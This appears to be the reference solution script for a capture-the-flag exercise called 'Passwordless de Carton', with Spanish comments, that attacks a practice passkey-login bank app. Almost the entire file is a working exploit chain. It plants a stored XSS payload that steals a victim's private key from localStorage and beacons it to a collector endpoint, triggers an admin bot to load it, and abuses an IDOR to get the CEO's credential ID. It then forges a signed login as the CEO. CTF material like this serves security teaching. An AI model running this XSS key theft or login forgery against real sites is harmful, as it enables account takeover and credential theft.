"""
Solucion de referencia del CTF "Passwordless de Carton" (HackerBank).

El servidor solo guarda claves publicas (como FIDO2 real). El ataque:
  1. Login como la cuenta de practica (registra su passkey).
  2. Deja un mensaje con un payload Stored XSS que roba la clave privada del CEO
     de su localStorage.
  3. Dispara la "ingenieria social" -> el bot CEO visita su inbox y ejecuta el
     payload, que exfiltra la clave privada al buzon /collect.
  4. Lee la clave privada del CEO en /collected, obtiene su credential_id por el
     IDOR de /auth/keys, firma un challenge fresco del CEO y entra -> flag.

El estudiante hace el paso 4 (la firma) desde la consola del navegador con
hbForge(); aca se hace en Python para tener un writeup ejecutable.

Requisitos:  pip install requests cryptography
Uso:         python solve.py [http://host:5000]
"""
import base64
import html
import re
import sys
import time

import requests
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:5000"
PRACTICE = "t3ny"
CEO_USER_ID = 7013

PAYLOAD = (
    "Hola, necesito ayuda con mi cuenta.\n"
    "<script>\n"
    "window.addEventListener('load', function () {\n"
    "  var user = document.getElementById('nombre_usuario').innerText;\n"
    "  if (user !== '" + PRACTICE + "') {\n"
    "    var priv = localStorage.getItem('hb_privkey_' + user);\n"
    "    new Image().src = '/collect?data=' + encodeURIComponent(priv);\n"
    "  }\n"
    "});\n"
    "</script>"
)


def raw_sig(priv, challenge):
    der = priv.sign(challenge.encode(), ec.ECDSA(hashes.SHA256()))
    r, s = decode_dss_signature(der)
    return (r.to_bytes(32, "big") + s.to_bytes(32, "big")).hex()


def priv_to_pkcs8_b64(priv):
    der = priv.private_bytes(serialization.Encoding.DER, serialization.PrivateFormat.PKCS8,
                             serialization.NoEncryption())
    return base64.b64encode(der).decode()


def register_and_login(s, username):
    """Registra una passkey para `username` y abre sesion. Devuelve (priv, credential_id)."""
    priv = ec.generate_private_key(ec.SECP256R1())
    pub_pem = priv.public_key().public_bytes(
        serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo).decode()
    cred_id = "cli-" + priv_to_pkcs8_b64(priv)[10:26]
    s.post(f"{BASE}/auth/register", json={"username": username, "credential_id": cred_id, "public_key": pub_pem})
    ch = s.post(f"{BASE}/auth/challenge", json={"username": username}).json()["challenge"]
    v = s.post(f"{BASE}/auth/verify", json={"username": username, "credential_id": cred_id,
                                            "challenge": ch, "signature": raw_sig(priv, ch)}).json()
    if not v.get("ok"):
        raise SystemExit(f"[!] No pude loguearme como {username}: {v}")
    return priv, cred_id


def main():
    s = requests.Session()

    # 1) login como la cuenta de practica
    register_and_login(s, PRACTICE)
    print(f"[1] Logueado como '{PRACTICE}'.")

    # 2) dejar el mensaje con el payload XSS
    s.post(f"{BASE}/messages", json={"body": PAYLOAD})
    print("[2] Mensaje con payload XSS dejado en la bandeja del administrador.")

    # 3) ingenieria social -> el bot CEO revisa su inbox y ejecuta el payload
    s.post(f"{BASE}/social/notify", json={"url": BASE})
    print("[3] Disparada la visita del CEO. Esperando la exfiltración...")

    # 4) esperar y leer la clave privada robada del buzon
    ceo_priv_b64 = None
    for _ in range(20):
        time.sleep(1)
        page = s.get(f"{BASE}/collected").text
        for m in re.findall(r'<div class="data">([^<]+)</div>', page):
            candidate = html.unescape(m).strip()
            if candidate and candidate != "None" and len(candidate) > 80:
                ceo_priv_b64 = candidate
                break
        if ceo_priv_b64:
            break
    if not ceo_priv_b64:
        raise SystemExit("[!] No llegó la clave al buzón (¿el bot CEO está corriendo?).")
    print(f"[4] Clave privada del CEO robada del buzón: {ceo_priv_b64[:32]}...")

    # 5) credential_id del CEO por el IDOR
    keys = s.get(f"{BASE}/auth/keys/{CEO_USER_ID}").json()
    ceo_cred_id = keys["credential_id"]
    print(f"[5] credential_id del CEO (IDOR): {ceo_cred_id}")

    # 6) firmar un challenge fresco del CEO con la clave robada y entrar
    ceo_priv = serialization.load_der_private_key(base64.b64decode(ceo_priv_b64), password=None)
    ch = s.post(f"{BASE}/auth/challenge", json={"username": "ceo"}).json()["challenge"]
    v = s.post(f"{BASE}/auth/verify", json={"username": "ceo", "credential_id": ceo_cred_id,
                                            "challenge": ch, "signature": raw_sig(ceo_priv, ch)}).json()
    if not v.get("ok"):
        raise SystemExit(f"[!] Falló el login como CEO: {v}")
    print(f"[6] Autenticados como el CEO. Redirige a: {v['next']}")

    dashboard = s.get(f"{BASE}{v['next']}").text
    flag = re.search(r"flag-code[^>]*>\s*([0-9a-f]{32})\s*<", dashboard)
    print(f"\n>>> CODIGO GANADOR: {flag.group(1) if flag else '(no encontrada)'}")


if __name__ == "__main__":
    main()
